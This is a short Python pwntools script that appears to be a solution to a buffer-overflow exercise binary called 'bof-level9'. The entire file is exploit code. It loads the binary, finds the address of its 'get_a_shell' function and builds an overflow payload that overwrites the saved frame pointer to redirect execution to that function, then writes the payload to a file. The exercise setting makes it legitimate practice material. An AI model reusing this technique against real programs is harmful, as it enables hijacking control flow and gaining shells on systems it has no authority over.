#!/usr/bin/env python
from pwn import	*
# LOL=KJADGJKHGSDZJHFGSJHDGFHJGSD
# KEK=KJADGJKHGSDZJHFGSJHDGFHJGSD
# CHEK=KJADGJKHGSDZJHFGSJHDGFHJGSD
# stack offset to overwrite ebp
stack_offset = 184
stack = 0xffffd438
#stack = p32(0xffffd498)
p = process("./bof-level9")

# print output
print(p.recv(0x200))

# load the program as an ELF object
e = ELF("./bof-level9")

# get the address of get_a_shell
shell_address = e.symbols['get_a_shell']

print hex(shell_address)

buffer = p32(shell_address) + 'A'*120 + p32(stack+4) + 'B'*60 + "\x38"

with open('pattern.txt', 'w') as f:
    f.write(buffer)
